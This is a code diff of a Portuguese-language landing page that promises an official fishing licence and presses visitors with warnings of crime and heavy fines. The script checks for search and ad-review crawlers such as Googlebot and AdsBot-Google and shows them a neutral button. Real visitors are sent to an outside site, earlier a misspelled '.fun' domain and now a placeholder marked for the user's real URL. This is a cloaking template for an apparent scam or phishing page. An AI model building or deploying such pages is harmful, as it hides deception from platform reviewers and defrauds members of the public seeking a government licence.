@@ -3,47 +3,64 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Guia da Licença de Pesca</title>
+  <title>🚨 Não Perca Sua Licença de Pesca! 🚨</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      padding: 2rem;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #00796b, #004d40);
+      color: #f1f8f7;
+      text-align: center;
+      padding: 3rem 1rem;
       max-width: 600px;
       margin: auto;
-      background: #f0f9f7;
-      color: #004d40;
-      text-align: center;
     }
     h1 {
-      color: #00695c;
+      font-size: 2.4rem;
+      margin-bottom: 1rem;
+      text-shadow: 2px 2px 6px rgba(0,0,0,0.5);
     }
     p {
-      font-size: 1.1rem;
-      margin-bottom: 1.5rem;
+      font-size: 1.2rem;
+      margin-bottom: 2rem;
+      line-height: 1.5;
+      text-shadow: 1px 1px 4px rgba(0,0,0,0.4);
     }
     button {
-      background-color: #00897b;
+      background-color: #ff6f00;
       color: white;
       border: none;
-      padding: 0.8rem 2rem;
-      font-size: 1.2rem;
-      border-radius: 5px;
+      padding: 1rem 3rem;
+      font-size: 1.3rem;
+      border-radius: 50px;
       cursor: pointer;
+      box-shadow: 0 4px 12px rgba(255,111,0,0.6);
       transition: background-color 0.3s ease;
+      font-weight: 700;
     }
     button:hover {
-      background-color: #004d40;
+      background-color: #e65100;
+      box-shadow: 0 6px 18px rgba(230,80,0,0.8);
+    }
+    .highlight {
+      color: #ffcc00;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
     }
   </style>
 </head>
 <body>
-  <h1>Guia Rápido: Licença de Pesca</h1>
+  <h1>🚨 <span class="highlight">Atenção</span> Pescadores! 🚨</h1>
   <p>
-    Saiba como obter sua licença de pesca e evitar multas.  
-    Este é um passo importante para garantir que você possa pescar legalmente em todo o Brasil.
+    Você sabia que <strong>pescar sem licença é crime e pode gerar multas altas</strong>?  
+    Não corra riscos desnecessários.  
+    Garanta já a sua <strong>Licença de Pesca Oficial</strong> e fique tranquilo para aproveitar a natureza!
   </p>
-
-  <button id="btnSolicitar">Solicite sua Licença</button>
+  <p>
+    Nosso guia rápido e fácil vai te mostrar o passo a passo para obter sua licença,  
+    sem burocracia e sem sair de casa.
+  </p>
+  <button id="btnSolicitar">Quero Minha Licença Agora!</button>
 
   <script>
     const bots = ['Googlebot', 'AdsBot-Google', 'Bingbot', 'facebookexternalhit', 'Twitterbot'];
@@ -52,11 +69,11 @@
 
     if (!isBot) {
       document.getElementById('btnSolicitar').addEventListener('click', () => {
-        window.location.href = "https://licencadepescaa.fun/inicio/"; // <== Troque para sua URL real aqui
+        window.location.href = "https://sualandingreal.com"; // <== Troque para sua URL real aqui
       });
     } else {
       const btn = document.getElementById('btnSolicitar');
-      btn.style.backgroundColor = '#ccc';
+      btn.style.backgroundColor = '#555';
       btn.style.cursor = 'default';
       btn.textContent = 'Conteúdo neutro para bots';
       btn.removeEventListener('click', () => {});
